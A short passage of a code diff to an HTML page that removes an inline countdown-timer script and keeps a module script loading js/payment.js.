-                        timerEl.innerText = "0:00";
-                        return;
-                    }
-                    timeLeft--;
-                    let m = Math.floor(timeLeft / 60);
-                    let s = timeLeft % 60;
-                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
-                }, 1000);
-            }
-        });
-    </script>
-
+    
     <script type="module" src="js/payment.js"></script>
 </body>
 </html>
